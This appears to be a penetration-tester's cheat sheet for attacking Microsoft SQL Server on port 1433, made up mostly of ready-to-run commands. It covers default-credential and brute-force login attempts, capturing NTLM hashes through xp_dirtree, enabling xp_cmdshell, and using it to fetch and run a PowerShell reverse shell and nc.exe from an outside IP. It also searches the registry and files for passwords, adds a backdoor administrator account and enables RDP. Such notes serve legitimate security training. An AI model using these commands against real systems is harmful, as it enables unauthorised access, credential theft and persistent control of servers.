# 1433 (MSSQL)

## Enumeration

### Checks

* [ ] Try default credentials "sa:password"
* [ ] Brute force creds
* [ ] Check database content for new passwords
* [ ] Check version for exploits
* [ ] RCE
  * [ ] through xp\_cmdshell functionality
  * [ ] through injecting payload in output file, placing it in webroot and triggering it through webapp

### Connection

#### sqsh

```bash
sqsh -S <IP> -U sa
sqsh -S <IP> -U sa -P password
sqsh -S <IP>:27900 -U sa -P password
```

#### mssqlclient.py

```bash
mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
mssqlclient.py <USER>:<PASSWORD>@<IP>

# Once logged in you can run queries:
SQL> select @@ version;

# Steal NTLM hash
sudo smbserver.py -smb2support liodeus .
SQL> exec master..xp_dirtree '\\<IP>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat

# Try to enable code execution
SQL> enable_xp_cmdshell

# Execute code
SQL> xp_cmdshell whoami /all
SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
```

### nmap

```bash
nmap -p 1433 --script='banner,(ms-sql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)' <IP> -o 1433_nmap_mssql
# Credential Brute Force
nmap -p 1433 --script ms-sql-brute --script-args passdb=/usr/share/seclists/Passwords/darkweb2017-top1000.txt <IP>

nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

### xp\_cmdshell

#### Enable

```bash
exec sp_configure 'show advanced options', 1
go
reconfigure
go
exec sp_configure 'xp_cmdshell', 1
go
reconfigure
go
```

#### Commands

```bash
# Manaul enumeration
xp_cmdshell 'whoami /all';
xp_cmdshell 'systeminfo';
xp_cmdshell 'net user';  # Potential for brute force or password re-use
xp_cmdshell 'reg query HKLM /f pass /t REG_SZ /s';  # Search registry for pass
xp_cmdshell 'findstr /si password *.txt *.ini *.config *xml'  # Check for plaintext passwords
# Run other PrivEsc commands for enumeration

# Download files for reverse shell
xp_cmdshell "powershell -c iex(new-object net.webclient).downloadstring('http://192.168.119.165:9090/Invoke-PowerShellTcp.ps1')";--
xp_cmdshell "certutil -urlcache -f 'http://192.168.119.165:9090/nc.exe' nc.exe"

# Create user and pass then add them to Admin group (Need enough permissions)
xp_cmdshell 'net user byte bytepass /add'
go
xp_cmdshell 'net localgroup Administrators byte /add'
go
xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
go
```

### Metasploit

```bash
use auxiliary/scanner/mssql/mssql_ping
```

## Brute Force

### Metasploit

```bash
scanner/mssql/mssql_login
```

### Hydra

```bash
hydra -l sa -P password.txt -V <IP> mssql
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u
```

### Cheat sheet

```bash
https://www.asafety.fr/mssql-injection-cheat-sheet/
```
